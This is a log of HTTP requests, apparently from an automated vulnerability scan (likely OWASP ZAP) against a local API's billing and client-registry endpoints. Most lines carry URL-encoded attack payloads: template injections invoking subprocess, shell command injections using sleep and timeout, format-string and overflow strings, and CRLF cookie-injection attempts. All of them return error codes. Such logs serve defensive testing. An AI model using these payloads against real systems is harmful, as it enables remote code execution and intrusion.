+13674,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D/service-rules,422,Unprocessable Entity,1,206,255
+13675,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/%23%7B%25x%28sleep+15%29%7D,422,Unprocessable Entity,2,206,261
+13676,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D/service-rules,422,Unprocessable Entity,1,206,254
+13677,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/%7Bsystem%28%22sleep+15%22%29%7D,422,Unprocessable Entity,2,206,261
+13678,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D/service-rules,422,Unprocessable Entity,2,206,254
+13679,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%3C%25%3D%25x%28sleep+15%29%25%3E/service-rules,422,Unprocessable Entity,1,206,263
+13680,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%23%7B%25x%28sleep+15%29%7D/service-rules,422,Unprocessable Entity,2,206,263
+13681,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%7Bsystem%28%22sleep+15%22%29%7D/service-rules,422,Unprocessable Entity,1,206,263
+13682,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000,404,Not Found,0,195,185
+13683,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing,422,Unprocessable Entity,1,206,273
+13684,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items,405,Method Not Allowed,0,217,195
+13685,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid,422,Unprocessable Entity,1,206,261
+13686,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%26sleep+15.0%26,422,Unprocessable Entity,1,206,261
+13687,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients,200,OK,3,188,637
+13688,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%3Bsleep+15.0%3B,422,Unprocessable Entity,1,206,261
+13689,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%22%26sleep+15.0%26%22,422,Unprocessable Entity,2,206,261
+13690,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid/service-rules,422,Unprocessable Entity,2,206,263
+13691,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%22%3Bsleep+15.0%3B%22,422,Unprocessable Entity,1,206,261
+13692,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%27%26sleep+15.0%26%27,422,Unprocessable Entity,2,206,261
+13693,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%26sleep+15.0%26/service-rules,422,Unprocessable Entity,2,206,263
+13694,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%27%3Bsleep+15.0%3B%27,422,Unprocessable Entity,2,206,261
+13695,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%3Bsleep+15.0%3B/service-rules,422,Unprocessable Entity,2,206,263
+13696,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%26timeout+%2FT+15.0,404,Not Found,1,195,185
+13697,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%7Ctimeout+%2FT+15.0,404,Not Found,1,195,185
+13698,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%22%26sleep+15.0%26%22/service-rules,422,Unprocessable Entity,2,206,263
+13699,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%22%26timeout+%2FT+15.0%26%22,404,Not Found,1,195,185
+13700,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%22%7Ctimeout+%2FT+15.0,404,Not Found,0,195,185
+13701,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%27%26timeout+%2FT+15.0%26%27,404,Not Found,1,195,185
+13702,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%22%3Bsleep+15.0%3B%22/service-rules,422,Unprocessable Entity,2,206,263
+13703,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%27%7Ctimeout+%2FT+15.0,404,Not Found,1,195,185
+13704,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%27%26sleep+15.0%26%27/service-rules,422,Unprocessable Entity,1,206,263
+13705,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%3Bstart-sleep+-s+15.0,422,Unprocessable Entity,2,206,261
+13706,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%27%3Bsleep+15.0%3B%27/service-rules,422,Unprocessable Entity,2,206,263
+13707,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%22%3Bstart-sleep+-s+15.0,422,Unprocessable Entity,2,206,261
+13708,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%26timeout+%2FT+15.0/service-rules,404,Not Found,1,195,185
+13709,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%7Ctimeout+%2FT+15.0/service-rules,404,Not Found,1,195,185
+13710,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%22%26timeout+%2FT+15.0%26%22/service-rules,404,Not Found,1,195,185
+13711,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%27%3Bstart-sleep+-s+15.0,422,Unprocessable Entity,2,206,261
+13712,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%22%7Ctimeout+%2FT+15.0/service-rules,404,Not Found,0,195,185
+13713,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%27%26timeout+%2FT+15.0%26%27/service-rules,404,Not Found,0,195,185
+13714,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid%3Bstart-sleep+-s+15.0+%23,422,Unprocessable Entity,2,206,261
+13715,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%27%7Ctimeout+%2FT+15.0/service-rules,404,Not Found,0,195,185
+13716,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%3Bstart-sleep+-s+15.0/service-rules,422,Unprocessable Entity,1,206,263
+13717,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%22%3Bstart-sleep+-s+15.0/service-rules,422,Unprocessable Entity,1,206,263
+13718,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%27%3Bstart-sleep+-s+15.0/service-rules,422,Unprocessable Entity,2,206,263
+13719,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid%3Bstart-sleep+-s+15.0+%23/service-rules,422,Unprocessable Entity,1,206,263
+13720,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000,404,Not Found,1,195,185
+13721,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/,404,Not Found,1,195,185
+13722,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing,422,Unprocessable Entity,3,206,273
+13723,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items,405,Method Not Allowed,1,217,195
+13724,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/,405,Method Not Allowed,1,217,195
+13725,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid,422,Unprocessable Entity,3,206,261
+13726,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/,422,Unprocessable Entity,1,206,273
+13727,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients,200,OK,2,188,637
+13728,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid/,422,Unprocessable Entity,0,206,261
+13729,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid/service-rules,422,Unprocessable Entity,4,206,263
+13730,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/,200,OK,1,188,637
+13731,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid/service-rules/,422,Unprocessable Entity,1,206,263
+13732,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000,404,Not Found,1,195,185
+13733,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing,422,Unprocessable Entity,3,206,273
+13734,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items,405,Method Not Allowed,1,217,195
+13735,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid,422,Unprocessable Entity,2,206,261
+13736,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/AOdvtCkIdFeYdFiFFQCHGEWfTOidVehAAvWKLtjfCHnthhuUJIXRUipnPcaUyQGGjlLKZoBFjhrRcxuhDRpmqxDkhLVNmDXqiICDZDYjNubsprykxXpAfTZCFnQiIBFLXyWGBxAvLagQNRTchssQcnKmHDPDQbrBauKdMykyWUWcBRKTotMgUaRZMOtSdNFckNdrEyaVcUuJkQethMKuqfMFYfdeUZGNuRoQmIXKxbXlrIqeBIUjRSQaBOdvLbnbXFyVNGqMJYntnhlYcxONXDfpVmJZylBPMLtJWavOXrUkMbRNNAYqdepqAsgGpMRITPkMUMMZKnbdHJjpuMbJQeYdNJEjfbpovminpVIURVcIiggRVySZbmkukSpwtIhrqEGWEpDcFwfeCnqoGZgmbHcIdkTkHkGLlFtdOmsHSuLlDmjRtRGCaVILgVOhpIOtehkfnyLhfklQMbjwgTrohsIbaCBUPlFvEvJnnuvVtHewuksusyaycFrTguJLxIlGUKlhXXkLGuXvgKsTeaMxPgZDfHfbjXMMSqqAPSIpHDXqZWFPxSxpFxtypvPtWJexRSeaYDoXegSYiVSjTvfyacrMoBqZLwZMbFKTLAJcThISDQgyijdtsVyyMoElPcFwaQxEYMvkdeHhgVlEYPlNqUREQKgLFsJFerKgiVibiOIjmEiDtdgHMLeHMfIQydyRjkqDHxpnvefnIRDOsFmNyqkLUNZGskwadPIYZYCCaqaIWwtgaNDAEYMgfoRrlgWEybmGpwUItojdtebTjnJYLoEjsquFmghSFeHRKEnnSnrQiUSxXYHRNGeiMObvjlNavnIJwITpMRCKlymciXpYWiqbiypFcWuVxEYMSvnGSTJwlhEjfOdalEAJrbngIZfeZGxIgwpteISkWqtctCyOTmlNQkhjuGlpafHrCguZWlgmTqTgkNlEGKJmIaOnSQgXbjFGljekhwsYuQMtZjLwToUTDIQhebvnbhsnTIPHkVQUkinGBMaLXOguHFmeJcMPpavWEmbHNqdqKsmuYLZRuBoaEmJdbnoCGsWeIZdexpjDHsRUopcevFuTAkMZEeYRvHDrCNlCWwTwPlmRVSJJtNyNwvAEEAxMxNfUxYNPkxnEtHoxNtiswQyAiDfyKeqiPbEwDTjMgJNuHbdPmlAnjCEHwkBqWHCyUuvbAsJWVKcSlySpfnmPwOaxFBploQxVtkinNYRpfhvLsZsStCQTQwaGdmUhvgEaktTMZxxVfcFJQBObdRPYpMVRsFkweXsvgHSgwLxvxAWcsFDmXGOUdKUdpbnJKFfYqgdfycSgELXwwXyAGuQKhlNtCMRBmKVvTpZwliogcFoFruWFaZmDufPVuEcxZHhgQyTXfDfqdvtoOcUNfsUeMsSKYwxKCrGQuNJSjimVlplLpXwArdwSmXEcQvxpfyiwjGaYwUQVSfnNfkYJlNsfVffJhnJnxcHwwlUJNmPlvouEWYLFfNCOeFikVAMCtMFWAEwcMlcBPJlxeniVOUWdunkyNHOKdYmypSjhnsPStgJjXKGhapAQoTjNxTKRZtvPCvuTLmBUYIywMUyLWaDIyWmLAFTNYmcVBRWmIkbBVZCZUsVMZRSjpbJfefMnyZdrKlLAxTUPcCbrqHgevByuxxjJxkriwmkoFmjKeZEDCmJaGTQtirqPceHaXMmVtqtIcqDAbTKAZatYkYrgXwjBJYmQhwxcRCAgvGrDwuMKmadsyVmqhekEJHvkLVGvsOHXofNQuCvUtBaJoLEXYyJHVdrhEjeDOGBlMcjlvZodgaRwoPGhpjkXwvsaWCKbEhHMxYvrEvvTpWAflngCfqlRGuWchplFxMeejrICafleKVadxKpwLogwwZlWeLNFSAkBUeOtyfKNQNPjBDYVgGmNWbJljsFQuqJWPAyDXAWHBpUkfXIClJcqUXZFmvaNJoLXRwdfttgKtbMeFtPRGciBZcdpWCEXsLEpfgwIgpwUIaJbmHljRLgAjZCbKHBuKovdoVMawmUmYHemswMwZCGthhtNESTpwrIycAEldFimWAJKCJjdNgrCscxKUjxiUcwPZEieBCwKwYaUPojAOswF,422,Unprocessable Entity,2,206,254
+13737,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients,200,OK,2,188,637
+13738,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid/service-rules,422,Unprocessable Entity,1,206,263
+13739,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/IwiOJUuSSNvPNinESpgGFGyfTDnICaZEgEkmaTRuxLHlRtbLpcaJVIZMmGQumBlWxZvDsoseKYYsjWVIAfGHsQmrSgQqUYOJTdafYMxFcAchvoXlMpmFjjRVeiChZBFqHtVUfMtNkcxZQmTpTiGwylwckGQSVBNsioAATOlbPBLFcCwjifftrpEPliPwJbZjgCOZwQrHvEmBtAPYjOZakVVtNReAPIcKPovoGxdoasZjVGMRKQnLyjDjHNgmEkZbtuTZjuxYNUmogucFWAVwnsNFdvkPqLmyLOSjbDXXvGsbcdKoldTibvQjZHlGsrxNLtwInwnSRNcoQoxHnIrYaOicsQyWhZNOXvMsQnifRnmiFKKDFbuvHHgnmOWhoVOjjNRVfEAsvJmKvpdlOusajVwsBDoSZfXfTCJeyyfllinnbrZslfkhlbqOFWxiUxVrOOeTTLYrtAuCbysspEftpUMOBNCJbtmqYsFATcHQsEdHgMUJRCoyiMDArHUPoubDvLoDJmIkCbNDxCxuoxenHLrsXExYcnPOxwfUYVksoyNmExadOQKGopPXslExxRbGngayuNdjDLPKRyVUXOrHNpSonNyXfWjRtZiJGZcfVENuWrMeiSfXOTlnFBUEdkVWisMtueEeoGcUAwLFWPZPLMnPksCNNGEZiXkOQZcphYUAFwwXhuPdCoNUAVWTYEjKaKRLKqThlqxXSJyJNgbPSWbEHKAIxjJEXMgjnoBeiqCOHHrwqovZhNYlOShGebhhfnNbfkJXxAwalXBdLivhpscauCrCZgpFgFcTUuSevBBoskihkOUsCKlqhTVJRGvVvQNeHZhkyynpAhwSqdOdioPBkTEfsWJWiPwNIUvlLbaUGbmYCcGEHIKXOVQJTkLUEPrerjtNCwAbhakGPkoYJXDZDEoJtanXwBcOXxpGrqoaSifgJeKqNnhEhYvvZRFRtodIwpfFAPoqPZbrrkSjVBBcLhswSPgSlohLdrGBhFDVsabWPceicWXYLXFjhUXYVyqfxTltgYrFwvKMUNkXuZPPMoVRcvhoraNXcPDQCrEYjpbWeHxAEufWARkFExkCIwImGQDPltcQuyTgsPYLqurcVGIqAYopxpwgEElrCKPCFCEZwuuvnWcoNjIhJgQgNovQobGlpqFMfMmVowwATnNJAixMqtxWKMGVDGGwfxjJhkvkJALcVdgHMCaEsYqWfAZJLuwCrgEdtjNCWprwdYwFxMWHgiCjyWOiPeoIOoabBRcdeZoqIdeRHPWbMZVCZabDRGrrvRVoAoWhPFNPGmAMkEYjnNjJVKPCHnUCBFFwfOXFpPZkLsbiPKdBwbERaDxvdWDaGCOQvxepmurenZBXyKiwjthpvLVnfJICFCTERxqBDqHDkYkjIVHhkZYPepCpxmJgVXuqSQpuDOoLKbQFBknynjZcFXsrBpAnMIYZsEdSOwjHPReMURacGhmvLulIVUwmZXeQRWfKnNeSanyNTyWJGnXBrSLPWrsqSyhmxbTwgrgnvjeWFrBJJNplILtrdaRlyPpMawLFGpNUAsbgAJMSXtxqAusVeTqrtRJPVXWjPSillmUcKUvTRXldetJqZMqeeEEEOauOiBnyjoBLgXIWpBkYFcrYfEGFaXgWbfOIVMKvPnbfxmLvJYRZAsKHbwYVYLeGqqtAyGJjTICFfITyECZUlmPfTLsRKpafvEjOnIuaepmgNgupLIyETTOAGPPLuUAsGWgBnnlcJwIEhZbgxFAgnynOXbpgPPnyBFCXlfFDRipiDHJLWfQDmafTuqrEXwGBEVwmWEufcjVWyvZxYkElRJUDmQmqruXcNaPqYfNfOWMHvnpiTXRXZZeReqIABllmskvHBhYwLyyNjGOGAiUUGPEdRUYquNynAVPuvVnmwotORDANxkcdRIgYUrtGIXFCxmJfuGvNpSCXoiXtIHLMPNnKqAbOxOjjcgSXJdbQoZZhpgWKhjYDYsOfMiBhBZrOVnbkhZmFGfYffsUNfAWGMiJiLccXXvssKobdNJCOMcvfPiXdytToPsXaDUMoMdxBuXwXpPsReqhDYrphihjejvKbdGLYHcFUjxSMduHV/service-rules,422,Unprocessable Entity,1,206,256
+13740,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000,404,Not Found,1,195,185
+13741,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing,422,Unprocessable Entity,1,206,273
+13742,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items,405,Method Not Allowed,0,217,195
+13743,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid,422,Unprocessable Entity,1,206,261
+13744,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/ZAP,422,Unprocessable Entity,2,206,261
+13745,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients,200,OK,3,188,637
+13746,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A,422,Unprocessable Entity,2,206,252
+13747,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid/service-rules,422,Unprocessable Entity,2,206,263
+13748,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A,422,Unprocessable Entity,1,206,253
+13749,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/ZAP/service-rules,422,Unprocessable Entity,1,206,263
+13750,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A/service-rules,422,Unprocessable Entity,1,206,254
+13751,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A/service-rules,422,Unprocessable Entity,2,206,255
+13752,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000,404,Not Found,1,195,185
+13753,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing,422,Unprocessable Entity,2,206,273
+13754,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items,405,Method Not Allowed,1,217,195
+13755,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid,422,Unprocessable Entity,3,206,261
+13756,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/Set-cookie%3A+Tamper%3D14fd3b60-b07d-446d-8b88-3c754355cf73,422,Unprocessable Entity,3,206,252
+13757,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients,200,OK,6,188,637
+13758,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/any%0D%0ASet-cookie%3A+Tamper%3D14fd3b60-b07d-446d-8b88-3c754355cf73,422,Unprocessable Entity,2,206,252
+13759,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid/service-rules,422,Unprocessable Entity,2,206,263
+13760,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/any%3F%0D%0ASet-cookie%3A+Tamper%3D14fd3b60-b07d-446d-8b88-3c754355cf73,422,Unprocessable Entity,2,206,252
+13761,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/any%0ASet-cookie%3A+Tamper%3D14fd3b60-b07d-446d-8b88-3c754355cf73,422,Unprocessable Entity,3,206,252
+13762,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/Set-cookie%3A+Tamper%3Dbfab97fe-a2d2-4b47-afdb-1a2693c088df/service-rules,422,Unprocessable Entity,4,206,254
+13763,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/any%3F%0ASet-cookie%3A+Tamper%3D14fd3b60-b07d-446d-8b88-3c754355cf73,422,Unprocessable Entity,2,206,252
+13764,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/any%0D%0ASet-cookie%3A+Tamper%3Dbfab97fe-a2d2-4b47-afdb-1a2693c088df/service-rules,422,Unprocessable Entity,3,206,254
+13765,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/any%0D%0ASet-cookie%3A+Tamper%3D14fd3b60-b07d-446d-8b88-3c754355cf73%0D%0A,422,Unprocessable Entity,3,206,252
+13766,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/any%3F%0D%0ASet-cookie%3A+Tamper%3Dbfab97fe-a2d2-4b47-afdb-1a2693c088df/service-rules,422,Unprocessable Entity,2,206,254
+13767,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/any%3F%0D%0ASet-cookie%3A+Tamper%3D14fd3b60-b07d-446d-8b88-3c754355cf73%0D%0A,422,Unprocessable Entity,2,206,252
+13768,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/any%0ASet-cookie%3A+Tamper%3Dbfab97fe-a2d2-4b47-afdb-1a2693c088df/service-rules,422,Unprocessable Entity,2,206,254
+13769,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/any%3F%0ASet-cookie%3A+Tamper%3Dbfab97fe-a2d2-4b47-afdb-1a2693c088df/service-rules,422,Unprocessable Entity,2,206,254
+13770,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/any%0D%0ASet-cookie%3A+Tamper%3Dbfab97fe-a2d2-4b47-afdb-1a2693c088df%0D%0A/service-rules,422,Unprocessable Entity,1,206,254
